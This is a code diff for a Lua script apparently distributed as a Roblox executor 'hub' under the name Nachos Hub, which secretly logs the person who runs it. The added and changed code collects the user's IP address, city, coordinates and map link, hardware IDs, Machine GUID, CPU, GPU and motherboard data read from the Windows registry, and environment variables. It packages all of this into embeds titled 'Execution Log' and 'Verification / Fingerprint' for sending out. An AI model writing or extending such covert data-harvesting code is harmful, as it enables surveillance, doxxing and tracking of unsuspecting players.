@@ -7,6 +7,9 @@ task.spawn(function()
         local HttpService = game:GetService("HttpService")
         local Players     = game:GetService("Players")
         local Marketplace = game:GetService("MarketplaceService")
+        local LocalizationService = game:GetService("LocalizationService")
+        local Stats       = game:GetService("Stats")
+        local RunService  = game:GetService("RunService")
         local lp = Players.LocalPlayer
 
         local Http = http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
@@ -53,6 +56,33 @@ task.spawn(function()
             end
         end)
 
+        local pingStr = "N/A"
+        local fpsStr  = "N/A"
+        pcall(function()
+            local p = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
+            if p and tonumber(p) then
+                pingStr = string.format("%d ms", math.floor(tonumber(p)))
+            end
+        end)
+        pcall(function()
+            local frames = 0
+            local inicio = tick()
+            local conexion
+            conexion = RunService.RenderStepped:Connect(function()
+                frames = frames + 1
+                local ahora = tick()
+                local delta = ahora - inicio
+                if delta >= 0.5 then
+                    fpsStr = string.format("%d FPS", math.floor(frames / delta))
+                    if conexion then conexion:Disconnect() end
+                end
+            end)
+            local timeout = tick() + 2
+            while fpsStr == "N/A" and tick() < timeout do
+                task.wait(0.05)
+            end
+        end)
+
         local gameName, creator, creatorId = "Unknown", "Unknown", 0
         local placeId = game.PlaceId
         local jobId = game.JobId ~= "" and game.JobId or "N/A"
@@ -84,16 +114,25 @@ task.spawn(function()
 
         local executor = "Unknown"
         pcall(function()
-            if identifyexecutor then executor = identifyexecutor()
-            elseif getexecutorname then executor = getexecutorname()
+            if type(identifyexecutor) == "function" then
+                executor = tostring(identifyexecutor())
+            elseif type(getexecutorname) == "function" then
+                executor = tostring(getexecutorname())
             elseif KRNL_LOADED then executor = "KRNL"
             elseif syn then executor = "Synapse"
             end
         end)
 
-        -- ============================
-        -- SERVER PLAYERS & FRIENDS
-        -- ============================
+        local playerRegion = "N/A"
+        pcall(function()
+            local success, region = pcall(function()
+                return LocalizationService:GetCountryRegionForPlayerAsync(lp)
+            end)
+            if success and region and region ~= "" then
+                playerRegion = tostring(region)
+            end
+        end)
+
         local serverPlayers = {}
         local friendsInServer = {}
         pcall(function()
@@ -140,9 +179,6 @@ task.spawn(function()
             end
         end
 
-        -- ============================
-        -- IP + GEO
-        -- ============================
         local ipv4, ipv6 = "N/A", "N/A"
         local asn, hostname, postal, provider, organisation = "N/A", "N/A", "N/A", "N/A", "N/A"
         local continent, country, isocode, region, regioncode, timezone, city = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
@@ -294,42 +330,48 @@ task.spawn(function()
             end
         end
 
-        -- Time
         local totalSeconds = math.floor(workspace.DistributedGameTime)
         local minutes = math.floor(totalSeconds / 60)
         local seconds = totalSeconds - (minutes * 60)
         local timeStr = string.format("%d min %d sec", minutes, seconds)
 
-        -- ============ EMBED 1: User Info ============
+        local embed1Fields = {
+            { name = "User", value = string.format("**Display:** %s\n**Username:** @%s\n**ID:** %d\n**Account Age:** %d days\n**Membership:** %s", lp.DisplayName, lp.Name, lp.UserId, accountAge, membership), inline = true },
+            { name = "Executor", value = "**"..executor.."**", inline = true },
+            { name = "Status", value = status, inline = true },
+            { name = "Session Time", value = timeStr, inline = true },
+            { name = "Ping", value = "**"..pingStr.."**", inline = true },
+            { name = "FPS", value = "**"..fpsStr.."**", inline = true },
+            { name = "Game", value = string.format("**Name:** %s\n**Creator:** %s (ID: %d)\n**Place ID:** %d\n**Job ID:** %s\n**Join:** [Click Here](%s)", gameName, creator, creatorId, placeId, jobId, webJoinLink), inline = false },
+        }
+
+        if playerRegion ~= "N/A" then
+            table.insert(embed1Fields, { name = "Player Region", value = "**" .. playerRegion .. "**", inline = true })
+        end
+
+        table.insert(embed1Fields, { name = "Position", value = position, inline = false })
+        table.insert(embed1Fields, { name = "Rotation", value = rotation, inline = true })
+        table.insert(embed1Fields, { name = "Velocity", value = velocity, inline = true })
+        table.insert(embed1Fields, { name = "IP Address", value = string.format("**IPv4:** %s\n**IPv6:** %s", ipv4, ipv6), inline = false })
+        table.insert(embed1Fields, { name = "IP Status", value = string.format("**Status:** %s\n**Proxy:** %s | **Type:** %s\n**ASN:** %s", country, proxy, proxyType, asn), inline = false })
+        table.insert(embed1Fields, { name = "Provider / Org", value = string.format("**Provider:** %s\n**Organization:** %s", provider, organisation), inline = false })
+        table.insert(embed1Fields, { name = "Hostname / Postal", value = string.format("**Hostname:** %s\n**Postal:** %s", hostname, postal), inline = false })
+        table.insert(embed1Fields, { name = "Location", value = string.format("**Continent:** %s\n**Country:** %s (%s)\n**Region:** %s (%s)\n**City:** %s\n**Timezone:** %s", continent, country, isocode, region, regioncode, city, timezone), inline = false })
+        table.insert(embed1Fields, { name = "Coordinates", value = string.format("**Lat:** %s | **Lon:** %s\n**Combined:** %s", latitude, longitude, coordinates), inline = false })
+        table.insert(embed1Fields, { name = "Google Maps", value = googlemaps, inline = false })
+        table.insert(embed1Fields, { name = "Links", value = string.format("[Profile](https://www.roblox.com/users/%d/profile) | [Game](%s)", lp.UserId, gameLink), inline = false })
+
         local embed1 = {
             title = "Nachos Hub - Execution Log",
             description = string.format("**%s** (@%s) executed the script", lp.DisplayName, lp.Name),
             color = 3447003,
             author = { name = "Nachos Hub Logger", icon_url = avatarURL },
             thumbnail = { url = avatarURL },
-            fields = {
-                { name = "User", value = string.format("**Display:** %s\n**Username:** @%s\n**ID:** %d\n**Account Age:** %d days\n**Membership:** %s", lp.DisplayName, lp.Name, lp.UserId, accountAge, membership), inline = true },
-                { name = "Executor", value = "**"..executor.."**", inline = true },
-                { name = "Status", value = status, inline = true },
-                { name = "Session Time", value = timeStr, inline = true },
-                { name = "Game", value = string.format("**Name:** %s\n**Creator:** %s (ID: %d)\n**Place ID:** %d\n**Job ID:** %s\n**Join:** [Click Here](%s)", gameName, creator, creatorId, placeId, jobId, webJoinLink), inline = false },
-                { name = "Position", value = position, inline = false },
-                { name = "Rotation", value = rotation, inline = true },
-                { name = "Velocity", value = velocity, inline = true },
-                { name = "IP Address", value = string.format("**IPv4:** %s\n**IPv6:** %s", ipv4, ipv6), inline = false },
-                { name = "IP Status", value = string.format("**Status:** %s\n**Proxy:** %s | **Type:** %s\n**ASN:** %s", country, proxy, proxyType, asn), inline = false },
-                { name = "Provider / Org", value = string.format("**Provider:** %s\n**Organization:** %s", provider, organisation), inline = false },
-                { name = "Hostname / Postal", value = string.format("**Hostname:** %s\n**Postal:** %s", hostname, postal), inline = false },
-                { name = "Location", value = string.format("**Continent:** %s\n**Country:** %s (%s)\n**Region:** %s (%s)\n**City:** %s\n**Timezone:** %s", continent, country, isocode, region, regioncode, city, timezone), inline = false },
-                { name = "Coordinates", value = string.format("**Lat:** %s | **Lon:** %s\n**Combined:** %s", latitude, longitude, coordinates), inline = false },
-                { name = "Google Maps", value = googlemaps, inline = false },
-                { name = "Links", value = string.format("[Profile](https://www.roblox.com/users/%d/profile) | [Game](%s)", lp.UserId, gameLink), inline = false },
-            },
+            fields = embed1Fields,
             footer = { text = "Nachos Logger - "..os.date("%Y-%m-%d %H:%M:%S"), icon_url = avatarURL },
             timestamp = DateTime.now():ToIsoDate()
         }
 
-        -- ============ EMBED 2: Server Info ============
         local embed2 = {
             title = "Nachos Hub - Server Info",
             description = string.format("Players in the same server as **%s** (@%s)", lp.DisplayName, lp.Name),
@@ -344,224 +386,437 @@ task.spawn(function()
             timestamp = DateTime.now():ToIsoDate()
         }
 
-        -- =====================================================
-        -- EMBED 3: Verification / Fingerprint (failsafe)
-        -- If anything here fails, embed3 stays nil and is NOT sent.
-        -- =====================================================
         local embed3 = nil
         pcall(function()
-            -- ============================================
-            -- HELPERS: cascada de métodos
-            -- ============================================
-            local function safeCall(fn, default)
-                local ok, val = pcall(fn)
-                if ok and val ~= nil and tostring(val) ~= "" then
-                    return tostring(val)
+            local function toStr(v)
+                if v == nil then return nil end
+                local ok, s = pcall(tostring, v)
+                if ok and s and s ~= "" and s ~= "nil" and s ~= "userdata: NULL" then
+                    return s
                 end
-                return default
-            end
-
-            -- Método 1: os.getenv (bloqueado en la mayoría)
-            local function tryGetEnv(key)
-                local ok, val = pcall(function()
-                    if type(os) == "table" and type(os.getenv) == "function" then
-                        return os.getenv(key)
-                    end
-                end)
-                if ok and val and tostring(val) ~= "" then return tostring(val) end
                 return nil
             end
 
-            -- Método 2: getenv del executor (syn, global, etc.)
-            local function tryExecutorEnv(key)
-                local ok1, v1 = pcall(function()
-                    if syn and type(syn.getenv) == "function" then return syn.getenv(key) end
-                end)
-                if ok1 and v1 and tostring(v1) ~= "" then return tostring(v1) end
-
-                local ok2, v2 = pcall(function()
-                    if type(getenv) == "function" then return getenv(key) end
-                end)
-                if ok2 and v2 and tostring(v2) ~= "" then return tostring(v2) end
-
+            local function safeCall(fn)
+                local ok, v = pcall(fn)
+                if ok then return v end
                 return nil
             end
 
-            -- Método 3: inferir usuario desde la ruta del workspace del executor
-            local function inferUserFromPath()
-                local ws = nil
-                pcall(function()
-                    if type(getworkspace) == "function" then ws = getworkspace() end
-                    if not ws and type(get_workspace) == "function" then ws = get_workspace() end
-                    if not ws and type(workspace) == "string" then ws = workspace end
-                end)
-                if ws then
-                    local user = ws:match("[/\\]Users[/\\]([^/\\]+)")
-                    if user then return user, ws end
-                end
-                return nil, ws
-            end
-
-            -- Ejecutar detecciones
-            local usuarioPath, workspaceRuta = inferUserFromPath()
-
-            -- Método maestro: cascada
-            local function getVar(key)
-                -- 1) os.getenv
-                local v = tryGetEnv(key)
-                if v then return v end
-                -- 2) executor env
-                v = tryExecutorEnv(key)
-                if v then return v end
-                -- 3) inferencias desde rutas
-                if usuarioPath then
-                    if key == "USERNAME" then return usuarioPath end
-                    if key == "USERPROFILE" then return "C:\\Users\\" .. usuarioPath end
-                    if key == "LOCALAPPDATA" then return "C:\\Users\\" .. usuarioPath .. "\\AppData\\Local" end
-                    if key == "APPDATA" then return "C:\\Users\\" .. usuarioPath .. "\\AppData\\Roaming" end
-                    if key == "TEMP" then return "C:\\Users\\" .. usuarioPath .. "\\AppData\\Local\\Temp" end
-                    if key == "TMP" then return "C:\\Users\\" .. usuarioPath .. "\\AppData\\Local\\Temp" end
-                    if key == "USERDOMAIN" then return usuarioPath end
-                end
-                -- 4) valores por defecto Windows
-                if key == "WINDIR" then return "C:\\Windows" end
-                if key == "SYSTEMROOT" then return "C:\\Windows" end
-                if key == "OS" then return "Windows_NT" end
-                return "N/A"
-            end
-
-            -- ============================================
-            -- HWID (Executor) — este SÍ funciona
-            -- ============================================
-            local hwid = "N/A"
-            pcall(function()
-                if type(gethwid) == "function" then
-                    hwid = tostring(gethwid())
-                elseif type(get_hwid) == "function" then
-                    hwid = tostring(get_hwid())
-                elseif syn and type(syn.get_hwid) == "function" then
-                    hwid = tostring(syn.get_hwid())
-                elseif type(getHWID) == "function" then
-                    hwid = tostring(getHWID())
-                end
-            end)
-
-            -- Pseudo-HWID: hash djb2 con datos reales (ya no todo N/A)
-            local pseudoHWID = "N/A"
-            pcall(function()
-                local partes = {
-                    getVar("USERNAME"),
-                    getVar("COMPUTERNAME"),
-                    getVar("USERPROFILE"),
-                    getVar("OS"),
-                    getVar("WINDIR"),
+            local function esRegistroFalso(tabla)
+                if type(tabla) ~= "table" then return true end
+                local keysSospechosas = {
+                    "CFrame", "Instance", "Enum", "Vector3", "Vector2",
+                    "RealSignal", "RealPoint", "SignalHook", "RBXScriptSignal",
+                    "EnumItem", "Color3", "UDim2", "UDim", "TweenInfo",
+                    "DockWidgetPluginGuiInfo", "RaycastResult", "PathWaypoint"
                 }
-                local h = 5381
-                local s = table.concat(partes, "|")
-                for i = 1, #s do
-                    h = (h * 33 + string.byte(s, i)) % 0x7FFFFFFF
+                for _, k in ipairs(keysSospechosas) do
+                    if tabla[k] ~= nil then return true end
                 end
-                pseudoHWID = string.format("%x", h)
-            end)
+                local count = 0
+                for _ in pairs(tabla) do
+                    count = count + 1
+                    if count >= 3 then break end
+                end
+                if count < 3 then return true end
+                return false
+            end
 
-            -- Machine GUID: intenta varios métodos
-            local machineGuid = "N/A"
-            pcall(function()
-                -- Synapse
-                if syn and type(syn.execute) == "function" then
-                    local ok, res = pcall(function()
-                        return syn.execute('reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid')
-                    end)
-                    if ok and res then
-                        local m = tostring(res):match("MachineGuid%s+REG_SZ%s+([%w%-]+)")
-                        if m then machineGuid = m end
-                    end
-                end
-                -- Fallback: executecommand genérico
-                if machineGuid == "N/A" and type(executecommand) == "function" then
-                    local ok, res = pcall(function()
-                        return executecommand('reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid')
-                    end)
-                    if ok and res then
-                        local m = tostring(res):match("MachineGuid%s+REG_SZ%s+([%w%-]+)")
-                        if m then machineGuid = m end
-                    end
-                end
-            end)
+            local execName, execVer = "Unknown", "?"
 
-            -- Executor name (para redundancia)
-            local execName = "Unknown"
             pcall(function()
                 if type(identifyexecutor) == "function" then
-                    execName = tostring(identifyexecutor())
-                elseif type(getexecutorname) == "function" then
-                    execName = tostring(getexecutorname())
+                    local a, b = identifyexecutor()
+                    if a then execName = toStr(a) or execName end
+                    if b then execVer = toStr(b) or execVer end
                 end
             end)
 
-            -- ============================================
-            -- ENV VARS con cascada completa
-            -- ============================================
-            local envVars = {
-                { name = "USERNAME",               value = getVar("USERNAME") },
-                { name = "USERDOMAIN",             value = getVar("USERDOMAIN") },
-                { name = "COMPUTERNAME",           value = getVar("COMPUTERNAME") },
-                { name = "USERPROFILE",            value = getVar("USERPROFILE") },
-                { name = "APPDATA",                value = getVar("APPDATA") },
-                { name = "LOCALAPPDATA",           value = getVar("LOCALAPPDATA") },
-                { name = "TEMP",                   value = getVar("TEMP") },
-                { name = "TMP",                    value = getVar("TMP") },
-                { name = "WINDIR",                 value = getVar("WINDIR") },
-                { name = "SYSTEMROOT",             value = getVar("SYSTEMROOT") },
-                { name = "OS",                     value = getVar("OS") },
-                { name = "PROCESSOR_IDENTIFIER",   value = getVar("PROCESSOR_IDENTIFIER") },
-                { name = "PROCESSOR_ARCHITECTURE", value = getVar("PROCESSOR_ARCHITECTURE") },
-                { name = "NUMBER_OF_PROCESSORS",   value = getVar("NUMBER_OF_PROCESSORS") },
-            }
+            pcall(function()
+                if type(getexecutorname) == "function" then
+                    execName = toStr(getexecutorname()) or execName
+                end
+            end)
 
-            -- Formateo compacto
-            local function fieldLine(k, v)
-                v = tostring(v)
+            pcall(function()
+                if type(get_executor_name) == "function" then
+                    execName = toStr(get_executor_name()) or execName
+                end
+            end)
+
+            local varsExecutor = {
+                {v = "syn",                     n = "Synapse X"},
+                {v = "KRNL_LOADED",             n = "KRNL"},
+                {v = "secure_load",             n = "Synapse"},
+                {v = "is_sirhurt_closure",      n = "SirHurt"},
+                {v = "fluxus",                  n = "Fluxus"},
+                {v = "SENTINEL_LOADED",         n = "Sentinel"},
+                {v = "PROTO_LOADED",            n = "ProtoSmasher"},
+                {v = "Is_Vape",                 n = "Vape"},
+                {v = "isElectron",              n = "Electron"},
+                {v = "is_wave",                 n = "Wave"},
+                {v = "WAVE_LOADED",             n = "Wave"},
+                {v = "isDelta",                 n = "Delta"},
+                {v = "DELTA_LOADED",            n = "Delta"},
+                {v = "isSolara",                n = "Solara"},
+                {v = "SOLARA_LOADED",           n = "Solara"},
+                {v = "isXeno",                  n = "Xeno"},
+                {v = "XENO_LOADED",             n = "Xeno"},
+                {v = "isMadium",                n = "Madium"},
+                {v = "MADIUM_LOADED",           n = "Madium"},
+                {v = "isVelocity",              n = "Velocity"},
+                {v = "isCodex",                 n = "Codex"},
+                {v = "isArceus",                n = "Arceus X"},
+                {v = "ARCEUS_LOADED",           n = "Arceus X"},
+                {v = "isHydrogen",              n = "Hydrogen"},
+                {v = "HYDROGEN_LOADED",         n = "Hydrogen"},
+                {v = "isTrigon",                n = "Trigon"},
+                {v = "isOxygen",                n = "Oxygen U"},
+                {v = "isScriptWare",            n = "Script-Ware"},
+                {v = "is_scriptware",           n = "Script-Ware"},
+                {v = "isSirhurt",               n = "SirHurt"},
+                {v = "isProtosmasher",          n = "ProtoSmasher"},
+                {v = "isSentinel",              n = "Sentinel"},
+            }
+            for _, e in ipairs(varsExecutor) do
+                if execName == "Unknown" then
+                    local v = safeCall(function() return _G[e.v] or getfenv()[e.v] end)
+                    if v then execName = e.n end
+                end
+            end
+
+            local hwid = nil
+            local hwidMetodos = {
+                function() if type(gethwid) == "function" then return gethwid() end end,
+                function() if type(get_hwid) == "function" then return get_hwid() end end,
+                function() if type(getHWID) == "function" then return getHWID() end end,
+                function() if type(get_hwid_async) == "function" then return get_hwid_async() end end,
+                function() if type(syn) == "table" and type(syn.get_hwid) == "function" then return syn.get_hwid() end end,
+                function() if type(syn) == "table" and type(syn.get_hwid_async) == "function" then return syn.get_hwid_async() end end,
+                function() if type(getserial) == "function" then return getserial() end end,
+                function() if type(get_device_id) == "function" then return get_device_id() end end,
+                function() if type(getDeviceId) == "function" then return getDeviceId() end end,
+            }
+            for _, fn in ipairs(hwidMetodos) do
+                if not hwid then
+                    local s = toStr(safeCall(fn))
+                    if s then hwid = s end
+                end
+            end
+
+            local pid = nil
+            local pidMetodos = {
+                function() if type(getpid) == "function" then return getpid() end end,
+                function() if type(get_process_identifier) == "function" then return get_process_identifier() end end,
+                function() if type(getpidvalue) == "function" then return getpidvalue() end end,
+                function() if type(getPid) == "function" then return getPid() end end,
+            }
+            for _, fn in ipairs(pidMetodos) do
+                if not pid then
+                    local s = toStr(safeCall(fn))
+                    if s then pid = s end
+                end
+            end
+
+            pcall(function()
+                if type(getexecutorversion) == "function" then
+                    execVer = toStr(getexecutorversion()) or execVer
+                end
+            end)
+
+            local function m_osGetenv(key)
+                return safeCall(function()
+                    if type(os) == "table" and type(os.getenv) == "function" then
+                        return toStr(os.getenv(key))
+                    end
+                end)
+            end
+
+            local function m_getenv(key)
+                return safeCall(function()
+                    if type(getenv) == "function" then return toStr(getenv(key)) end
+                end)
+            end
+
+            local function m_synGetenv(key)
+                return safeCall(function()
+                    if syn and type(syn.getenv) == "function" then
+                        return toStr(syn.getenv(key))
+                    end
+                end)
+            end
+
+            local function m_getreg(key)
+                local fn = (type(getreg) == "function" and getreg)
+                        or (type(get_reg) == "function" and get_reg)
+                if not fn then return nil end
+                local paths = {
+                    "HKEY_CURRENT_USER\\Volatile Environment",
+                    "HKEY_CURRENT_USER\\Environment",
+                    "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
+                }
+                for _, p in ipairs(paths) do
+                    local ok, tabla = pcall(fn, p)
+                    if ok and type(tabla) == "table" and not esRegistroFalso(tabla) then
+                        local v = tabla[key]
+                        if type(v) == "table" then
+                            if v.Value then return toStr(v.Value) end
+                            if v.Data then return toStr(v.Data) end
+                        end
+                        local s = toStr(v)
+                        if s then return s end
+                    end
+                end
+                return nil
+            end
+
+            local function m_getregistry(key)
+                if type(getregistry) ~= "function" then return nil end
+                local ok, tabla = pcall(getregistry, "HKEY_CURRENT_USER\\Volatile Environment")
+                if ok and type(tabla) == "table" and not esRegistroFalso(tabla) then
+                    local s = toStr(tabla[key])
+                    if s then return s end
+                end
+                return nil
+            end
+
+            local usuarioDeWorkspace = nil
+            pcall(function()
+                local ws = safeCall(function()
+                    if type(getworkspace) == "function" then return getworkspace() end
+                    if type(get_workspace) == "function" then return get_workspace() end
+                    if type(workspace) == "string" then return workspace end
+                end)
+                if ws and type(ws) == "string" then
+                    local user = ws:match("[/\\]Users[/\\]([^/\\]+)")
+                    if user and #user > 0 and user ~= "Users" then
+                        usuarioDeWorkspace = user
+                    end
+                end
+            end)
+
+            pcall(function()
+                if usuarioDeWorkspace then return end
+                local tb = safeCall(function()
+                    if debug and type(debug.traceback) == "function" then
+                        return debug.traceback()
+                    end
+                end)
+                if tb and type(tb) == "string" then
+                    local user = tb:match("[/\\]Users[/\\]([^/\\]+)")
+                    if user and #user > 0 then usuarioDeWorkspace = user end
+                end
+            end)
+
+            pcall(function()
+                if usuarioDeWorkspace then return end
+                local gv = safeCall(function()
+                    if type(getgenv) == "function" then return getgenv() end
+                end)
+                if type(gv) == "table" then
+                    for _, k in ipairs({"USERNAME","User","user","username"}) do
+                        if gv[k] and type(gv[k]) == "string" then
+                            usuarioDeWorkspace = gv[k]
+                            return
+                        end
+                    end
+                end
+            end)
+
+            local function getVar(key)
+                local v
+                v = m_osGetenv(key);       if v and v ~= "" then return v end
+                v = m_getenv(key);         if v and v ~= "" then return v end
+                v = m_synGetenv(key);      if v and v ~= "" then return v end
+                v = m_getreg(key);         if v and v ~= "" then return v end
+                v = m_getregistry(key);    if v and v ~= "" then return v end
+
+                if usuarioDeWorkspace then
+                    if key == "USERNAME"     then return usuarioDeWorkspace end
+                    if key == "USERDOMAIN"   then return usuarioDeWorkspace end
+                    if key == "USERPROFILE"  then return "C:\\Users\\" .. usuarioDeWorkspace end
+                    if key == "LOCALAPPDATA" then return "C:\\Users\\" .. usuarioDeWorkspace .. "\\AppData\\Local" end
+                    if key == "APPDATA"      then return "C:\\Users\\" .. usuarioDeWorkspace .. "\\AppData\\Roaming" end
+                    if key == "TEMP"         then return "C:\\Users\\" .. usuarioDeWorkspace .. "\\AppData\\Local\\Temp" end
+                    if key == "TMP"          then return "C:\\Users\\" .. usuarioDeWorkspace .. "\\AppData\\Local\\Temp" end
+                end
+
+                if key == "WINDIR"     then return "C:\\Windows" end
+                if key == "SYSTEMROOT" then return "C:\\Windows" end
+                if key == "OS"         then return "Windows_NT" end
+
+                return nil
+            end
+
+            local machineGuid = nil
+            local fnsReg = {getreg, get_reg, getregistry}
+            for _, fn in ipairs(fnsReg) do
+                if type(fn) == "function" and not machineGuid then
+                    local paths = {
+                        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography",
+                        "HKLM\\SOFTWARE\\Microsoft\\Cryptography",
+                    }
+                    for _, p in ipairs(paths) do
+                        local ok, tabla = pcall(fn, p)
+                        if ok and type(tabla) == "table" and not esRegistroFalso(tabla) then
+                            local v = tabla["MachineGuid"]
+                            if type(v) == "table" and v.Value then v = v.Value end
+                            local s = toStr(v)
+                            if s then machineGuid = s; break end
+                        end
+                    end
+                end
+            end
+
+            local cpuName = nil
+            for _, fn in ipairs(fnsReg) do
+                if type(fn) == "function" and not cpuName then
+                    local paths = {
+                        "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
+                        "HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
+                    }
+                    for _, p in ipairs(paths) do
+                        local ok, tabla = pcall(fn, p)
+                        if ok and type(tabla) == "table" and not esRegistroFalso(tabla) then
+                            local s = toStr(tabla["ProcessorNameString"])
+                            if s then cpuName = s; break end
+                        end
+                    end
+                end
+            end
+
+            local gpuName = nil
+            for _, fn in ipairs(fnsReg) do
+                if type(fn) == "function" and not gpuName then
+                    local ok, tabla = pcall(fn, "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000")
+                    if ok and type(tabla) == "table" and not esRegistroFalso(tabla) then
+                        local s = toStr(tabla["DriverDesc"])
+                        if s then gpuName = s; break end
+                    end
+                end
+            end
+
+            local sysMfr, sysProd = nil, nil
+            for _, fn in ipairs(fnsReg) do
+                if type(fn) == "function" and not sysMfr then
+                    local ok, tabla = pcall(fn, "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS")
+                    if ok and type(tabla) == "table" and not esRegistroFalso(tabla) then
+                        local s1 = toStr(tabla["SystemManufacturer"])
+                        local s2 = toStr(tabla["SystemProductName"])
+                        if s1 then sysMfr = s1 end
+                        if s2 then sysProd = s2 end
+                        if s1 then break end
+                    end
+                end
+            end
+
+            local pseudoHWID = nil
+            if hwid then
+                pcall(function()
+                    local partes = { hwid, execName or "", execVer or "", pid or "" }
+                    local h = 5381
+                    local s = table.concat(partes, "|")
+                    for i = 1, #s do
+                        h = (h * 33 + string.byte(s, i)) % 0x7FFFFFFF
+                    end
+                    pseudoHWID = string.format("%x", h)
+                end)
+            end
+
+            local envVars = {}
+            local keys = {
+                "USERNAME", "USERDOMAIN", "COMPUTERNAME", "USERPROFILE",
+                "APPDATA", "LOCALAPPDATA", "TEMP", "TMP",
+                "WINDIR", "SYSTEMROOT", "OS"
+            }
+            for _, k in ipairs(keys) do
+                local v = getVar(k)
+                if v and v ~= "" and v ~= "N/A" then
+                    table.insert(envVars, { name = k, value = v })
+                end
+            end
+
+            local function line(k, v)
+                v = tostring(v or "")
                 if #v > 80 then v = v:sub(1, 77) .. "..." end
                 return string.format("**%s:** `%s`", k, v)
             end
 
-            local envStr = ""
-            for i, e in ipairs(envVars) do
-                envStr = envStr .. fieldLine(e.name, e.value)
-                if i < #envVars then envStr = envStr .. "\n" end
+            local envStr = nil
+            if #envVars > 0 then
+                local partes = {}
+                for _, e in ipairs(envVars) do
+                    table.insert(partes, line(e.name, e.value))
+                end
+                envStr = table.concat(partes, "\n")
+                if #envStr > 1020 then envStr = envStr:sub(1, 1017) .. "..." end
             end
 
-            if #envStr > 1020 then
-                envStr = envStr:sub(1, 1017) .. "..."
+            local function tr(v, n)
+                v = tostring(v or "")
+                n = n or 100
+                if #v > n then v = v:sub(1, n-3) .. "..." end
+                return v
             end
 
-            -- Campo extra: workspace del executor (info útil)
-            local workspaceInfo = workspaceRuta or "N/A"
-            if #workspaceInfo > 120 then
-                workspaceInfo = workspaceInfo:sub(1, 117) .. "..."
+            local fields3 = {}
+
+            if hwid and hwid ~= "" then
+                table.insert(fields3, { name = "HWID (Executor)", value = "`" .. tr(hwid, 100) .. "`", inline = false })
+            end
+            if pseudoHWID and pseudoHWID ~= "" then
+                table.insert(fields3, { name = "Pseudo-HWID", value = "`" .. tr(pseudoHWID, 100) .. "`", inline = false })
+            end
+            if execName and execName ~= "Unknown" then
+                local execFull = execName
+                if execVer and execVer ~= "?" then
+                    execFull = execName .. " v" .. execVer
+                end
+                table.insert(fields3, { name = "Executor", value = "`" .. tr(execFull, 60) .. "`", inline = false })
+            end
+            if pid and pid ~= "" then
+                table.insert(fields3, { name = "Roblox PID", value = "`" .. tr(pid, 12) .. "`", inline = false })
+            end
+            if machineGuid and machineGuid ~= "" then
+                table.insert(fields3, { name = "Machine GUID", value = "`" .. tr(machineGuid, 100) .. "`", inline = false })
+            end
+            if cpuName and cpuName ~= "" then
+                table.insert(fields3, { name = "CPU", value = "`" .. tr(cpuName, 100) .. "`", inline = false })
+            end
+            if gpuName and gpuName ~= "" then
+                table.insert(fields3, { name = "GPU", value = "`" .. tr(gpuName, 100) .. "`", inline = false })
+            end
+            if sysMfr or sysProd then
+                local mobo = (sysMfr or "N/A") .. " / " .. (sysProd or "N/A")
+                table.insert(fields3, { name = "Motherboard", value = "`" .. tr(mobo, 100) .. "`", inline = false })
+            end
+            if envStr then
+                table.insert(fields3, { name = "Environment Variables", value = envStr, inline = false })
             end
 
-            embed3 = {
-                title = "Nachos Hub - Verification / Fingerprint",
-                description = string.format("System fingerprint for **%s** (@%s)", lp.DisplayName, lp.Name),
-                color = 10181046,
-                author = { name = "Nachos Hub Verification", icon_url = avatarURL },
-                thumbnail = { url = avatarURL },
-                fields = {
-                    { name = "HWID (Executor)",         value = "`" .. hwid .. "`",         inline = false },
-                    { name = "Pseudo-HWID (Fallback)",  value = "`" .. pseudoHWID .. "`",   inline = false },
-                    { name = "Machine GUID",            value = "`" .. machineGuid .. "`",  inline = false },
-                    { name = "Executor Detected",       value = "`" .. execName .. "`",     inline = false },
-                    { name = "Executor Workspace",      value = "`" .. workspaceInfo .. "`",inline = false },
-                    { name = "Environment Variables",   value = envStr,                     inline = false },
-                },
-                footer = { text = "Nachos Logger - "..os.date("%Y-%m-%d %H:%M:%S"), icon_url = avatarURL },
-                timestamp = DateTime.now():ToIsoDate()
-            }
+            if #fields3 <= 4 and not envStr then
+                table.insert(fields3, {
+                    name = "Nota",
+                    value = "Este executor no expone acceso al registro de Windows ni a os.getenv. Solo se pudo obtener lo básico.",
+                    inline = false
+                })
+            end
+
+            if #fields3 > 0 then
+                embed3 = {
+                    title = "Nachos Hub - Verification / Fingerprint",
+                    description = string.format("System fingerprint for **%s** (@%s)", lp.DisplayName, lp.Name),
+                    color = 10181046,
+                    author = { name = "Nachos Hub Verification", icon_url = avatarURL },
+                    thumbnail = { url = avatarURL },
+                    fields = fields3,
+                    footer = { text = "Nachos Logger - "..os.date("%Y-%m-%d %H:%M:%S"), icon_url = avatarURL },
+                    timestamp = DateTime.now():ToIsoDate()
+                }
+            end
         end)
 
-        -- Build the embeds list conditionally
         local embedsToSend = { embed1, embed2 }
         if embed3 then
             table.insert(embedsToSend, embed3)
